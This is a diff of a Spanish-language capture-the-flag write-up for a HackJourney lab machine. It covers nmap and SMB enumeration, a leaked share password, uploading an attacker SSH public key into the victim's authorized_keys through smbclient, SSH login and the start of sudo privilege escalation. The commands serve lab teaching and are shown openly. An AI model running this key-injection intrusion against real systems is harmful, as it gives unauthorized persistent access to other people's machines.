@@ -4,7 +4,7 @@
 
 **Este write-up forma parte del laboratorio de HackJourney. Para más información, visita [www.hackjourney.com](https://www.hackjourney.com)**
 
-# 🧬 1. **Reconocimiento**
+# 1. **Reconocimiento**
 
 ### 🔍 Escaneo de puertos:
 ```bash
@@ -20,7 +20,7 @@ sudo nmap 10.10.56.58 -n -Pn -sC -sV -sS --min-rate 5000 -oN scan1.txt
 
 ---
 
-# 🧬 2. **Enumeración**
+# 2. **Enumeración**
 
 ### 🔎 Enumeración de recursos SMB:
 ```bash
@@ -52,7 +52,7 @@ n0m30olv1d0123!
 
 ---
 
-# 🧬 3. **Explotación inicial**
+# 3. **Explotación inicial**
 
 ### 🚪 Acceso al share `pedro`:
 ```bash
@@ -78,7 +78,7 @@ ab740cf8182f14d13f608e372a697bb1
 
 ---
 
-# 🧬 4. **Movimiento lateral**
+# 4. **Movimiento lateral**
 
 ### 🔒 Intento de acceso SSH:
 ```bash
@@ -89,38 +89,55 @@ Resultado: ❌ `Permission denied (publickey)`
 
 ---
 
-# 🧬 5. **Estrategia alternativa (Key Injection)**
+# 5. **Estrategia alternativa (Key Injection)**
 
 ### 🔑 Creación de par de claves SSH:
 ```bash
 ssh-keygen -t rsa -b 4096 -f carnival_pedro_key
 ```
 
-Preparación de `authorized_keys`:
+## 🔐 ¿Por qué renombrar la clave pública a `authorized_keys`?
+
+Cuando generas un par de claves SSH con `ssh-keygen`, obtienes dos archivos:
+
+- `carnival_pedro_key` → clave **privada**
+- `carnival_pedro_key.pub` → clave **pública**
+
+Para que el servidor (en este caso la máquina víctima) reconozca al cliente (tú) como autorizado a acceder, **la clave pública debe colocarse en el archivo `authorized_keys` dentro del directorio `.ssh` del usuario objetivo**.  
+Este archivo puede contener **una o varias claves públicas**, y es donde `sshd` (el servidor SSH) consulta para verificar si la conexión debe permitirse con base en la clave que presenta el cliente.
+
+Por eso, se realiza el siguiente comando:
 ```bash
 cp carnival_pedro_key.pub authorized_keys
 ```
 
+## 📂 ¿Dónde debe ir `authorized_keys`?
+
+En la máquina víctima, debe existir la siguiente estructura de archivos en el **home del usuario** objetivo
+`/home/pedro/.ssh/authorized_keys`
+
+
 Subida mediante `smbclient`:
 ```bash
 smbclient \\\\10.10.56.58\\pedro -U pedro
+mkdir ./.ssh
+cd ./.ssh
 put authorized_keys
 ```
 
+
 ---
 
-# 🧬 6. **Acceso SSH exitoso**
-
-Conexión usando clave privada:
+# 6. **Acceso SSH exitoso**
+Una vez que la clave pública esté correctamente en `/home/pedro/.ssh/authorized_keys`, y se hayan configurado bien los permisos, puedes intentar el acceso SSH:
 ```bash
 ssh -i carnival_pedro_key pedro@10.10.56.58
 ```
-
 Resultado: ✅ Shell como `pedro`.
 
 ---
 
-# 🧬 7. **Escalada de privilegios**
+# 7. **Escalada de privilegios**
 
 ### 🔍 Enumeración de permisos sudo:
 ```bash
@@ -145,7 +162,7 @@ whoami
 
 ---
 
-# 🧬 8. **Captura de bandera de root**
+# 8. **Captura de bandera de root**
 
 ### 📂 Navegación hacia `/root/`:
 ```bash
